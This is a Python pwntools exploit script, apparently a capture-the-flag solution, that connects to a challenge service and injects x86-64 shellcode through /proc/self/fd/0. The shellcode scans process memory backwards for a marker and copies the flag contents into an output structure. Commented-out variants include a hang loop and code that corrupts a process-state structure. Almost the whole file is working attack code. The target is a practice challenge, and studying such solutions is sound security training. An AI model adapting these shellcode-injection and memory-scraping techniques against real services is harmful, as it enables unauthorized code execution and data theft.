#!/usr/bin/env python3

from pwn import *
from dataclasses import dataclass

context.arch = "amd64"
context.bits = 64


@dataclass
class Result:
    name: bytes
    done: bool = False
    start_time: int = 0
    took: int = 0


HOST = os.environ.get("HOST", "localhost")
PORT = 31337

r = remote(HOST, int(PORT))
# r = process("./challenge")
context.log_level = "debug"


def run_file(filename):
    while True:
        r.sendlineafter(b"3. Exit", "1")
        r.sendlineafter(b"> ", filename)
        if r.recvline() == b"1. Run file\n":
            break


def run_data(data):
    while True:
        r.sendlineafter(b"3. Exit", "1")
        r.sendlineafter(b"> ", "/proc/self/fd/0")
        r.send(data.ljust(0x100, b"\x90"))
        if r.recvline() == b"1. Run file\n":
            break


HANG = b"\xeb\xfe"

# run_data(HANG)
# run_data(b"\xc3")

# for i in range(3):
#     run_data(HANG)

# rdi: result
# rsi: f
# run_data(asm("""
#     mov rdi, [rbp-0x28]
#     lea rsi, [rbp-0x38]
#     mov rcx, 0x1000000
#     waste:
#     dec rcx
#     jnz waste
#     sub rsi, 8
#     mov dword ptr [rdi+4], 1 /* mark as done so waitpid didn't happen */
#     mov [rdi+0x60], rsi
#     mov rax, 60
#     mov rdi, 0x77
#     syscall
# """))
run_file("/flag")
time.sleep(0.2)
r.sendlineafter(b"3. Exit", "2")
run_data(asm("""
    call self
    self:
    pop rsi
    again:
    cmp dword ptr [rsi], 1702259020
    jz found
    dec rsi
    jmp again
    found:
    mov rdi, [rbp-0x28]
    add rdi, 0xC
    mov rcx, 64 
    rep movsb 
    ret
"""))

r.sendlineafter(b"3. Exit", "2")
r.sendlineafter(b"3. Exit", "3")
print(r.recvall())
